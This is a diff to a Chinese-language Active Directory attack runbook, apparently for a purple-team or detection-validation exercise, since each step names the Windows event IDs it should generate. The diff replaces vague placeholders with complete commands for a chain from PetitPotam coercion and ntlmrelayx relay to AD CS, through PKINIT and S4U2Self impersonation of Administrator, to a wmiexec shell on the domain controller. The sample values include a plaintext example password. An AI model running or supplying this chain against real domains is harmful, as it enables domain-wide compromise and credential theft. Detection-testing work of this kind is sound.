@@ -5,7 +5,7 @@
 此情境利用 **PetitPotam** 觸發 DC 認證，透過 **ntlmrelayx** 轉發至 AD CS 申請憑證，最終透過 **S4U2Self** 機制取得域管理權限。
 
 **攻擊路徑**: 
-`PetitPotam (Trigger) -> ntlmrelayx (Relay to AD CS) -> certipy/PKINIT (TGT) -> getST (S4U2Self) -> DCSync/Admin Access`
+`PetitPotam (Trigger) -> ntlmrelayx (Relay to AD CS) -> getTGT/PKINIT (TGT) -> getST (S4U2Self) -> DCSync/Admin Access`
 
 ## 2. 環境準備 (Prerequisites)
 - **Attacker**: Kali Linux (安裝 Impacket, PetitPotam)
@@ -34,55 +34,66 @@
 在攻擊機 (Kali Linux) 準備必要的工具和環境：
 ```bash
 # 安裝必要工具（參考你們內部核准的安裝方法）
-# Impacket: 用於 ntlmrelayx 和相關 Kerberos 工具
-# certipy: 用於 PKINIT 憑證認證
+# Impacket: 用於 ntlmrelayx、getTGT、getST、wmiexec
 # PetitPotam: 用於觸發強制認證
 
 # 設定攻擊機監聽介面
 ip addr show  # 確認攻擊機 IP
 ```
 
-### Step 3: 觸發強制認證 (PetitPotam)
-使用核准的觸發工具強制 DC 向攻擊機發起 NTLM 認證：
+### Step 3: 啟動監聽與轉發 (Attacker)
+在攻擊機上啟動 ntlmrelayx，監聽 SMB (445) 並轉發至 AD CS HTTP Endpoint。
 ```bash
-# 參考格式：觸發 DC 向攻擊機發起認證
-# python3 PetitPotam.py ATTACKER_IP DC_IP
+# 請替換 <AD_CS_IP> 為實際 AD CS 伺服器 IP
+# ntlmrelayx.py -t http://<AD_CS_IP>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+# 保持此視窗開啟，等待連線
+```
+
+### Step 4: 觸發 NTLM 認證 (Attacker)
+開啟新視窗，使用 PetitPotam 強制 DC 向攻擊機發起 NTLM 認證。
+```bash
+# 語法: python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <ATTACKER_IP> <DC_IP>
+# 範例:
+# python3 PetitPotam.py -d contoso.com -u lowpriv -p Password123 192.168.1.100 192.168.1.10
+# 執行成功後，Step 3 的視窗將截獲認證並顯示獲取的 Base64 憑證 (Certificate)
 # 這會產生 Event 4648 (DC 機器帳號向攻擊機發起認證)
 ```
 
-### Step 4: 啟動 NTLM Relay 監聽
-設定 ntlmrelayx 監聽並轉發到 AD CS：
+### Step 5: 提取並轉換憑證 (Attacker)
+將 ntlmrelayx 輸出的 Base64 憑證內容存為 cert.b64，並轉換格式。
 ```bash
-# 參考格式：啟動 relay 監聽，指向 AD CS Web Enrollment
-# ntlmrelayx.py -t https://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
-# 監聽在攻擊機的 SMB 端口，等待 DC 連線
+# 轉換為 PEM 格式 (假設私鑰已提取或由 ntlmrelayx 自動處理)
+# 若 ntlmrelayx 直接輸出 .pfx 或 .ccache，請依據實際輸出調整
+# 這裡假設使用 getTGT.py 需要的格式
+# (註: 最新版 ntlmrelayx 通常會自動儲存憑證，請查看輸出目錄)
 ```
 
-### Step 5: 處理憑證與 PKINIT 認證
-當 relay 成功後，處理取得的憑證並進行 Kerberos PKINIT：
+### Step 6: 執行 PKINIT 獲取 TGT (Attacker)
+使用 DC 的機器帳號憑證申請 TGT。
 ```bash
-# 參考格式：使用 certipy 進行 PKINIT 認證
-# certipy auth -pfx DC_CERTIFICATE.pfx -dc-ip DC_IP -username DC$
+# <DC_HOSTNAME> 為 DC 的機器名稱 (不含 $)
+# python3 getTGT.py -cert-pem dc01.pem -key-pem dc01.key <DOMAIN>/<DC_HOSTNAME>$
+# 設定環境變數以使用 TGT:
+# export KRB5CCNAME=./<DC_HOSTNAME>$.ccache
 # 這會產生 Event 4768 (PKINIT TGT 請求)
 ```
 
-### Step 6: S4U2Self 特權提升
-使用取得的 TGT 進行 S4U2Self 模擬：
+### Step 7: 執行 S4U2Self 權限提升 (Attacker)
+利用 S4U2Self 機制，以 DC 機器帳號身分模擬 Administrator 獲取服務票證。
 ```bash
-# 參考格式：使用 getST 進行 S4U2Self
-# getST.py -dc-ip DC_IP DOMAIN/DC$ -impersonate Administrator -spn cifs/DC_FQDN -k
+# python3 getST.py -k -spn cifs/<DC_FQDN> -impersonate Administrator <DOMAIN>/<DC_HOSTNAME>$
+# export KRB5CCNAME=./Administrator.ccache
 # 這會產生 Event 4769 (S4U2Self 服務票證請求)
 ```
 
-### Step 7: 驗證高權限存取
-使用取得的服務票證驗證權限提升：
+### Step 8: 驗證存取 (Attacker)
+使用模擬的 Administrator 票證訪問 DC，驗證權限。
 ```bash
-# 參考格式：驗證管理員權限
-# 使用取得的票證執行權限驗證操作
+# python3 wmiexec.py -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>
 # 這會產生對應的 4624、4672、4688 等事件
 ```
 
-### Step 8: 現場核對與驗證
+### Step 9: 現場核對與驗證
 在每個步驟執行後，立即在對應系統核對事件記錄：
 - DC: 檢查 Security Log 中對應 Event ID
 - CA: 檢查 AD CS 稽核日志
